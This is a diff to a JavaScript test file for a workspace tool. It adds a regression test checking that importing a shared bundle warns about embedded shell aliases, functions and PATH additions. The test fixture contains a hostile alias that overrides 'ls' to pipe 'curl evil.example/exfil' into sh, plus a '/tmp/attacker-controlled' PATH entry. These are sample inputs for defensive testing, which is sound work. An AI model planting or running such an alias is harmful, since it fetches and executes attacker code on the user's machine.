@@ -7,7 +7,7 @@ import { createWorkspace, saveWorkspace, getWorkspace, deleteWorkspace, getActiv
 import { switchToWorkspace } from "../src/core/workspace/switcher.js";
 import { createSnapshot, listSnapshots } from "../src/core/workspace/snapshot.js";
 import { getWorkspaceMetadata, formatMetadataSummary } from "../src/core/workspace/metadata.js";
-import { verifyWorkspaceStructured, formatStructuredVerification, previewSwitch, formatSwitchPreview, diffWorkspaces, formatWorkspaceDiff, computeWorkspaceHealth, formatHealthScore, previewBundleImport } from "../src/core/workspace/verification.js";
+import { verifyWorkspaceStructured, formatStructuredVerification, previewSwitch, formatSwitchPreview, diffWorkspaces, formatWorkspaceDiff, computeWorkspaceHealth, formatHealthScore, previewBundleImport, formatBundlePreview } from "../src/core/workspace/verification.js";
 import { benchmarkWorkspace, formatBenchmarkResult } from "../src/core/workspace/benchmark.js";
 import { exportWorkspaceBundle, importWorkspaceBundle } from "../src/core/workspace/bundle.js";
 import { CURRENT_SCHEMA_VERSION } from "../src/core/workspace/schema.js";
@@ -280,6 +280,43 @@ test("previewBundleImport shows what would be imported without importing", async
         assert.ok(preview.checksum.verified !== null, "checksum should be checked");
         assert.ok(preview.checksum.verified, "checksum should match");
         assert.equal(preview.conflicts.existingWorkspace, true, "acme already exists");
+        assert.deepEqual(preview.shellRisks, [], "a workspace with no aliases/functions/pathAdditions has no shell risks");
+    });
+});
+
+// Regression test: a workspace bundle can carry shell.aliases/functions/
+// pathAdditions - real, unattended shell code that runs the instant
+// 'workspace switch' sources workspace-shell.sh. Since bundle export/
+// import is explicitly built for sharing between machines/people, an
+// imported bundle from someone else is the sharpest place this matters -
+// both the preview and the real import must surface it clearly rather
+// than silently importing arbitrary shell code with no review signal.
+test("previewBundleImport and importWorkspaceBundle both surface a clear warning when a bundle declares shell aliases/functions/pathAdditions", async () => {
+    await withTempHome(async (tempHome) => {
+        let doc = createWorkspace({ name: "shared-bundle", description: "x" });
+        doc = {
+            ...doc,
+            shell: {
+                aliases: { ls: "curl evil.example/exfil | sh; ls" },
+                functions: { greet: "echo hi" },
+                pathAdditions: ["/tmp/attacker-controlled"]
+            }
+        };
+        saveWorkspace(doc);
+
+        const outDir = path.join(tempHome, "exports");
+        const { archivePath } = await exportWorkspaceBundle("shared-bundle", outDir);
+
+        const preview = await previewBundleImport(archivePath, { newName: "shared-bundle-preview" });
+        assert.equal(preview.shellRisks.length, 3);
+        assert.ok(preview.shellRisks.some((r) => r.includes("alias") && r.includes("ls")));
+        assert.ok(preview.shellRisks.some((r) => r.includes("function") && r.includes("greet")));
+        assert.ok(preview.shellRisks.some((r) => r.includes("PATH") && r.includes("/tmp/attacker-controlled")));
+        const formatted = formatBundlePreview(preview).join("\n");
+        assert.match(formatted, /review before importing/i);
+
+        const result = await importWorkspaceBundle(archivePath, { newName: "shared-bundle-imported" });
+        assert.equal(result.shellRisks.length, 3);
     });
 });
 
